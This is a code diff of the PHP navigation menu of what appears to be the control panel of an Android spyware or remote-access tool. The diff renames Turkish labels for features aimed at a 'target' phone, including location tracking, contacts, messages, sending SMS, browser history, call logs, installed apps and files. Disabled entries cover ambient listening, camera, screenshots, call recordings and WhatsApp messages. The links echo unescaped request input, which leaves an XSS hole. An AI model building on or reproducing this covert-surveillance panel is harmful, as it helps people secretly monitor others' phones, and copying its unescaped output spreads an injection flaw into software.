@@ -66,25 +66,25 @@ if (!isset($_GET['target']) || !isset($_GET['type'])){
 
         <div class="col-lg-2">
             <div class="list-group">
-                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=1" class="list-group-item <?php if ($_GET['type']==1){ echo 'active';}?>">Telefon detayları</a>
-                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=2" class="list-group-item <?php if ($_GET['type']==2){ echo 'active';}?>">Lokasyon Takibi</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=1" class="list-group-item <?php if ($_GET['type']==1){ echo 'active';}?>">Özellikler</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=2" class="list-group-item <?php if ($_GET['type']==2){ echo 'active';}?>">Lokasyon</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=3" class="list-group-item <?php if ($_GET['type']==3){ echo 'active';}?>"">Rehber</a>
-                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=4" class="list-group-item <?php if ($_GET['type']==4){ echo 'active';}?>">Tüm Mesajlar</a>
-                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=5" class="list-group-item <?php if ($_GET['type']==5){ echo 'active';}?>">Mesaj Gönder</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=4" class="list-group-item <?php if ($_GET['type']==4){ echo 'active';}?>">Mesajlar</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=5" class="list-group-item <?php if ($_GET['type']==5){ echo 'active';}?>">SMS Gönder</a>
                <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=6" class="list-group-item <?php if ($_GET['type']==6){ echo 'active';}?>">Ortam Dinleme</a> -->
                 <!--  <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=7" class="list-group-item <?php if ($_GET['type']==7){ echo 'active';}?>">Chat</a> -->
-                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=8" class="list-group-item <?php if ($_GET['type']==8){ echo 'active';}?>">Ekran Mesajı</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=8" class="list-group-item <?php if ($_GET['type']==8){ echo 'active';}?>">Toast</a>
                 <!--  <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=9" class="list-group-item <?php if ($_GET['type']==9){ echo 'active';}?>">Ekran Görüntüsü</a> -->
                 <!--  <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=10" class="list-group-item <?php if ($_GET['type']==10){ echo 'active';}?>">Kamera</a> -->
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=11" class="list-group-item <?php if ($_GET['type']==11){ echo 'active';}?>">Tarayıcı</a>
-                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=12" class="list-group-item <?php if ($_GET['type']==12){ echo 'active';}?>">Arama Geçmişi</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=12" class="list-group-item <?php if ($_GET['type']==12){ echo 'active';}?>">Aramalar</a>
                 <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=13" class="list-group-item <?php if ($_GET['type']==13){ echo 'active';}?>">Arama Ses Kayıtları</a> -->
-                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=14" class="list-group-item <?php if ($_GET['type']==14){ echo 'active';}?>">Uygulama Listesi</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=14" class="list-group-item <?php if ($_GET['type']==14){ echo 'active';}?>">Uygulamalar</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=15" class="list-group-item <?php if ($_GET['type']==15){ echo 'active';}?>">Dosyalar</a>
                 <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=16" class="list-group-item <?php if ($_GET['type']==16){ echo 'active';}?>">Whattsap Mesajları</a> -->
                 <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=17" class="list-group-item <?php if ($_GET['type']==17){ echo 'active';}?>">Kullanıcıya Ses Dinlettir</a> -->
                 <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=18" class="list-group-item <?php if ($_GET['type']==18){ echo 'active';}?>">Numara Ara</a> -->
-                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=19" class="list-group-item <?php if ($_GET['type']==19){ echo 'active';}?>">Metin Seslendirme</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=19" class="list-group-item <?php if ($_GET['type']==19){ echo 'active';}?>">TTS</a>
 
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=20" class="list-group-item">Çıkış</a>
             </div>
